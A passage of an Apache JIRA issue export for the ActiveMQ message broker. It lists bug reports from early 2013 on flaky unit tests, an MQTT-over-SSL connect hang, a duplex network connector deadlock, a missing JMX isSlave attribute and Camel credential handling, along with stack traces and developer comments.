","Ubuntu, jdk7",kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Feb/13 21:09;kearls;AMQ-4345.patch;https://issues.apache.org/jira/secure/attachment/12570860/AMQ-4345.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,314486,,,Mon Feb 25 21:18:25 UTC 2013,,,,,,,,,,,"0|i1i9p3:",314830,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"25/Feb/13 21:13;tabish;Is the pom.xml changes in there relevant to this issue?;;;","25/Feb/13 21:16;kearls;No, sorry about that.  It should only be a one line change to NIOSSLConcurrencyTest.java
;;;","25/Feb/13 21:18;tabish;Fix applied, thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-web-console can't be installed on Karaf 2.2.x,AMQ-4343,12633803,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,iocanel,iocanel,24/Feb/13 16:31,24/Sep/13 07:22,14/Jul/23 05:43,24/Sep/13 07:22,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,The bundle requires org.osgi.framework version 1.6.0 or higher. It should be able to also work with 1.5.,,davsclaus,iocanel,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Feb/13 16:35;iocanel;AMQ-4343.patch;https://issues.apache.org/jira/secure/attachment/12570670/AMQ-4343.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,314298,,,Tue Sep 24 07:22:01 UTC 2013,,,,,,,Patch Available,,,,"0|i1i8jj:",314643,,,,,,,,,,,,,,,,,,,,,"24/Sep/13 07:22;davsclaus;Thanks for the patch.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MemoryUsageCleanupTest fails intermittently,AMQ-4342,12633661,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,22/Feb/13 18:17,22/Feb/13 18:25,14/Jul/23 05:43,22/Feb/13 18:25,,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,"This test fails intermittently at a point where it expects BrokerView.getMemoryPercentUsage() to return 0, but it returns 1.  The problem here is that getMemoryPercentageUsage returns an int, and that number is truncated when calculated.

I did some debugging and found when the test fails the actual usage is about 0.85%, and when it fails it's only 1.02%.  I'll attach a patch that makes the assertion here slightly more lenient to accommodate for this.
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Feb/13 18:18;kearls;AMQ-4342.patch;https://issues.apache.org/jira/secure/attachment/12570506/AMQ-4342.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,314156,,,Fri Feb 22 18:25:30 UTC 2013,,,,,,,Patch Available,,,,"0|i1i7nz:",314501,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"22/Feb/13 18:25;tabish;Patch applied, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MQTTSSLTest has multiple test cases that fail frequently,AMQ-4338,12633271,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,20/Feb/13 20:52,21/May/13 16:36,14/Jul/23 05:43,21/May/13 16:36,,,,,,,,,Test Cases,,,,0,,,,,,,,,"MQTTSSLTest has multiple different test cases (including testSendAndReceiveExactlyOnce, testSendAndReceiveLargeMessages, testSendAndReceiveMQTT, testSendAtLeastOnceReceiveAtMostOnce, testSendAtLeastOnceReceiveExactlyOnce, testSendJMSReceiveMQTT, testSendMQTTReceiveJMS) which fail fairly frequently because of a hang on the provider.connect() call in initializeConnection() as shown in the stacktrace below. 

Another problem with this test is it was giving a misleading error when run under Hudson, showing that the test that followed it (MQTTTest) was failing instead.  I think this was because of the way it was using AutoFailTestSupport.  I will attach a patch which removes that and uses timeouts on @Test annotations instead.

testSendAndReceiveLargeMessages(org.apache.activemq.transport.mqtt.MQTTSSLTest)  Time elapsed: 30.004 sec  <<< ERROR!
java.lang.Exception: test timed out after 30000 milliseconds
        at sun.misc.Unsafe.park(Native Method)
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:834)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:994)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1303)
        at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:236)
        at org.fusesource.mqtt.client.Promise.await(Promise.java:88)
        at org.fusesource.mqtt.client.BlockingConnection.connect(BlockingConnection.java:49)
        at org.apache.activemq.transport.mqtt.FuseMQQTTClientProvider.connect(FuseMQQTTClientProvider.java:39)
        at org.apache.activemq.transport.mqtt.MQTTSSLTest.initializeConnection(MQTTSSLTest.java:60)


Results :

Tests in error:
  MQTTSSLTest>AbstractMQTTTest.testSendAndReceiveLargeMessages:247->initializeConnection:60 »
",,kearls,pmarques,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Feb/13 20:54;kearls;AMQ-4338.patch;https://issues.apache.org/jira/secure/attachment/12570180/AMQ-4338.patch","21/Feb/13 20:27;kearls;AMQ-4338A.patch;https://issues.apache.org/jira/secure/attachment/12570350/AMQ-4338A.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,313767,,,Tue May 21 16:36:53 UTC 2013,,,,,,,Patch Available,,,,"0|i1i59j:",314112,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"20/Feb/13 23:17;tabish;Added the patch, guess we need to figure out why these are all failing now. ;;;","21/Feb/13 20:27;kearls;This patch bumps up the timeouts from the previous patch.  I had set them to 30 seconds, but that's not enough on some slow nodes.;;;","25/Feb/13 15:22;tabish;Are you sure those timeouts are sensible, going from 30000 to 300000 seems like there must be something else going on.  ;;;","25/Feb/13 15:52;kearls;Actually, you're right, those are probably not sensible.  The problem test cases include:

testSendAndReceiveAtLeastOnce
testSendAtLeastOnceReceiveAtMostOnce
testSendAtLeastOnceReceiveExactlyOnce
testSendJMSReceiveMQTT

On my mac all test cases run in less that 3 seconds.  On Ubuntu and AIX, the cases named above sometimes run for ~120 seconds, and sometimes can run even longer, or just hang if there's no timeout.

;;;","26/Feb/13 18:22;tabish;I did some profiling and testing today.  So far I couldn't find any real issues.  It seems that in the case of these tests the QOS setting just makes things ungodly slow due to all the back and forth acking that's going on.  I guess its possible there's something amiss in the FuseSource MQTT client library but so far I haven't found anything.;;;","19/Mar/13 10:04;pmarques;We have this problem in our servers (activemq 5.8.0)... It actually behaves a little more predictably, if we try to access the service locally everything works great, if the server and client are in different machines every call to connect blocks permanently. I would think that this problem should have a priority higher than ""Minor"" since it makes mqtt over ssl unusable... 
We use activemq server and clients in windows and tried both mqtt+nio+ssl and mqtt+ssl without success. Using only tcp connections everything works fine.;;;","19/Mar/13 16:36;tabish;Pedro, what MQTT client are you using to connect to the Broker with?;;;","20/Mar/13 11:07;pmarques;I was testing the system with fusesource client... My code is basically this:
{code}
	MQTT mqtt = new MQTT();
	mqtt.setHost(url);
	mqtt.setUserName(user);
	mqtt.setPassword(password);

	BlockingConnection connection = mqtt.blockingConnection();
	connection.connect();
{code}
I think the problem I was having was the one described in this issue because the call hangs on ""connection.connect()"". The code works perfectly when run on the same machine as the server or when the url is not ssl based.



;;;","20/May/13 17:44;tabish;This one looks like its fixed now with the latest MQTT client pulled into the build. ;;;","21/May/13 16:36;tabish;Tests seems stable now.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ 5.8: Failed to execute purge task,AMQ-4333,12632979,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,anacortes,anacortes,19/Feb/13 13:10,22/Feb/13 15:56,14/Jul/23 05:43,22/Feb/13 15:56,,,,,,5.9.0,,,,,,,0,,,,,,,,,"With a ""clean"" ActiveMQ 5.8 (without any queues), i can purge without any problem (./bin/activemq purge). 
But when i deploy my Camel application in the normal way (then ActiveMQ has now the queues of my application), i cannot purge anymore. 

I receive the next problem: 

ERROR: java.lang.RuntimeException: Failed to execute purge task. Reason: javax.management.ReflectionException: No such operation: purge 
java.lang.RuntimeException: Failed to execute purge task. Reason: javax.management.ReflectionException: No such operation: purge 
        at org.apache.activemq.console.command.PurgeCommand.runTask(PurgeCommand.java:140) 
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) 
        at org.apache.activemq.console.command.AbstractJmxCommand.execute(AbstractJmxCommand.java:387) 
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:150) 
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) 
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:104) 
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 
.... 
Caused by: java.lang.NoSuchMethodException: purge() 
        at com.sun.jmx.mbeanserver.PerInterface.noSuchMethod(PerInterface.java:150) 
        at com.sun.jmx.mbeanserver.PerInterface.invoke(PerInterface.java:94) 
..... 


See: http://activemq.2283324.n4.nabble.com/ActiveMQ-5-8-Failed-to-execute-purge-task-td4663610.html

",,anacortes,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,313475,,,Fri Feb 22 15:56:59 UTC 2013,,,,,,,,,,,"0|i1i3gn:",313820,Regression,Unit Test Broken,,,,,,,,,,,,,,,,,,,"22/Feb/13 15:56;gtully;fix in http://svn.apache.org/r1449080

unit test missed due to its naming convention. renamed to xTest to match all others.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LargeQueueSparseDeleteTest gets timeouts on testMoveMessages and testRemoveMessages,AMQ-4332,12632978,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,19/Feb/13 12:51,09/Apr/13 16:09,14/Jul/23 05:43,09/Apr/13 16:09,,,,,,,,,Test Cases,,,,0,,,,,,,,,"Both of these test have 10 second timeouts, but while occasionally completing in 6-7 seconds, generally are averaging 10-12.  I'll attach a patch which bumps up the timeouts, but if you want I can add a bug to look into a possible performance issue here.  I ran these tests against the 5.7 fuse branch and they averaged 4-5 seconds.",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Feb/13 12:52;kearls;AMQ4332.patch;https://issues.apache.org/jira/secure/attachment/12569933/AMQ4332.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,313474,,,Tue Apr 09 16:09:34 UTC 2013,,,,,,,Patch Available,,,,"0|i1i3gf:",313819,Regression,Unit Test Broken,,,,,,,,,,,,,,,,,,,"20/Feb/13 17:05;tabish;Applied changes to the tests.;;;","09/Apr/13 16:09;kearls;I haven't seen this fail in a while.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MessageSelectorTest fails because of dated config file,AMQ-4331,12632900,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,18/Feb/13 21:28,18/Feb/13 21:48,14/Jul/23 05:43,18/Feb/13 21:48,,,,,,,,,Test Cases,,,,0,,,,,,,,,"The activemq.xml file used by this test contained:

    <persistenceAdapter>
      <kahaPersistenceAdapter directory=""file:target/amq1095""
          maxDataFileLength=""200000""/>
    </persistenceAdapter>

which is no longer valid.  I fixed the test by changing it to 

    <persistenceAdapter>
      <kahaDB directory=""file:target/amq1095""/>
    </persistenceAdapter>",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Feb/13 21:29;kearls;AMQ4331.patch;https://issues.apache.org/jira/secure/attachment/12569860/AMQ4331.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,313396,,,Mon Feb 18 21:48:30 UTC 2013,,,,,,,Patch Available,,,,"0|i1i2z3:",313741,Regression,Unit Test Broken,,,,,,,,,,,,,,,,,,,"18/Feb/13 21:48;tabish;patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Removal of Master/Slave removed isSlave() JMX api,AMQ-4330,12632894,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,mattrpav,mattrpav,18/Feb/13 20:49,13/Aug/13 18:59,14/Jul/23 05:43,22/Feb/13 15:34,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"The task to remove the Master/Slave functionality (AMQ-4165) also removed the isSlave() attribute from the Broker. 

This attribute is also used when a broker is polling a shared datastore using the master+slave polling model. Several large user groups will be impacted by this, as they have scripts that monitor this attribute in order to re-balance brokers after maintenance or failure scenarios.

Please reinstate.

Thanks",All,akuntamukkala,mattrpav,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,313390,,,Tue Aug 13 18:59:31 UTC 2013,,,,,,,,,,,"0|i1i2xr:",313735,,,,,,,,,,,,,,,,,,,,,"22/Feb/13 15:34;tabish;Merged the API back in.  Should be in the next SNAPSHOT build. ;;;","13/Aug/13 18:59;akuntamukkala;Is there anyway this can be made available in a 5.8.x release? ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cross talk over duplex network connection can lead to blocking,AMQ-4328,12632847,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,18/Feb/13 15:21,28/Mar/17 13:55,14/Jul/23 05:43,18/Feb/13 15:34,5.7.0,5.8.0,,,,5.9.0,,,Connector,,,,0,bridge,duplex,hang,network,,,,,"with active forwarding in both directions a duplex network connector can block. in 5.8, threads of the form:{code}""ActiveMQ BrokerService[xx] Task-10"" daemon prio=10 tid=0xb35d1c00 nid=0xc64 runnable [0xb3369000]
   java.lang.Thread.State: RUNNABLE
	at java.net.SocketOutputStream.socketWrite0(Native Method)
	at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:92)
	at java.net.SocketOutputStream.write(SocketOutputStream.java:136)
	at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:115)
	at java.io.DataOutputStream.flush(DataOutputStream.java:106)
	at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:176)
	at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:322)
	at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:304)
	at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)
	at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
	at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81)
	at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:994)
	at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:201)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:138)
	at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:127)
	- locked <0x647f4650> (a java.util.concurrent.atomic.AtomicBoolean)
	at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:104)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
	at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
	at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1378)
	at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:897)
	at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:943)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)

""ActiveMQ Transport: tcp:///xx:61616@40803"" prio=10 tid=0xb3525400 nid=0xbec waiting on condition [0xb3276000]
   java.lang.Thread.State: WAITING (parking)
	at sun.misc.Unsafe.park(Native Method)
	- parking to wait for  <0x64657028> (a java.util.concurrent.locks.ReentrantLock$NonfairSync)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:156)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:842)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178)
	at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)
	at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:66)
	at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
	at org.apache.activemq.network.DemandForwardingBridgeSupport$7.onCompletion(DemandForwardingBridgeSupport.java:630)
	at org.apache.activemq.transport.FutureResponse.set(FutureResponse.java:65)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:109)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:138)
	at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:127)
	- locked <0x647f4c80> (a java.util.concurrent.atomic.AtomicBoolean)
	at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:104)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
	at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
	at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1378)
	at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:897)
	at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:857)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:186)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:138)
	at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:127)
	- locked <0x647e6528> (a java.util.concurrent.atomic.AtomicBoolean)
	at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:104)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
	at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81)
	at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:622)
	at org.apache.activemq.network.DemandForwardingBridgeSupport$3.onCommand(DemandForwardingBridgeSupport.java:219)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:662){code}",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4276,AMQ-5342,,,,,,AMQ-6640,,,,,,,,,"04/Jul/14 13:50;matteor;deadlock.jpg;https://issues.apache.org/jira/secure/attachment/12654104/deadlock.jpg",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,313343,,,Mon Feb 18 15:34:00 UTC 2013,,,,,,,,,,,"0|i1i2nb:",313688,,,,,,,,,,,,,,,,,,,,,"18/Feb/13 15:24;gtully;the asyncRequests to provide reliable forwarding in AMQ-4276 need an async transport to ensure non blocking. This bug provides proof;;;","18/Feb/13 15:34;gtully;fix and test in http://svn.apache.org/r1447323;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
camel doen't honor credentials set on activemqcomponent bean via spring,AMQ-4325,12632702,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,kotkot,kotkot,16/Feb/13 08:38,07/Jun/14 20:58,14/Jul/23 05:43,02/Nov/13 19:51,5.8.0,,,,,5.10.0,5.9.1,,Camel,,,,0,,,,,,,,,"I use this configuration to create activemq component.
<bean id=""activemq""
          class=""org.apache.activemq.camel.component.ActiveMQComponent"" factory-method=""activeMQComponent"">
        <constructor-arg index=""0"" value=""${grabber.broker.url}"" />
        <property name=""useMessageIDAsCorrelationID"" value=""true""/>
        <property name=""userName"" value=""system""/>
        <property name=""password"" value=""manager""/>
    </bean>

Endpoint url doesn't have username and password set which results jms client not being able to connect to broker which responds with ""username is null"".
Setting username and password in endpoint url works   ",activemq 5.8.0,artnaseef,davsclaus,kotkot,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,313198,,,Sat Jun 07 20:58:50 UTC 2014,,,,,,,,,,,"0|i1i1rb:",313544,,,,,,,,,,,,,,,,,,,,,"02/Nov/13 18:56;davsclaus;It works if you do not use that factory-method, eg

{code}
  <bean id=""activemq"" class=""org.apache.activemq.camel.component.ActiveMQComponent"">
    <property name=""brokerURL"" value=""vm://testBroker""/>
    <property name=""userName"" value=""admin""/>
    <property name=""password"" value=""secret""/>
  </bean>
{code};;;","07/Jun/14 20:58;artnaseef;Git commit: https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=48d615d3113cf3d2a9d33bd5264c4f334d34b5c5;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
last modified producer audit checkpoint can prevent gc with cached bursty producers,AMQ-4323,12632578,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,15/Feb/13 13:26,15/Feb/13 13:35,14/Jul/23 05:43,15/Feb/13 13:35,5.8.0,,,,,5.9.0,,,Message Store,,,,0,,,,,,,,,"from https://issues.apache.org/jira/browse/AMQ-3833 the audit is only persisted when modified, which prevents an idle broker from cranking away on disk, but it also means that a data file is retained. which can prevent gc due to dependent acks.
the audit should be rewritten if it is holding up gc.",,gtully,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3833,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,313074,,,Fri Feb 15 13:35:41 UTC 2013,,,,,,,,,,,"0|i1i0zr:",313420,,,,,,,,,,,,,,,,,,,,,"15/Feb/13 13:35;gtully;fix in http://svn.apache.org/r1446577

if audit is first in gc list is rewritten to the current active data file;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
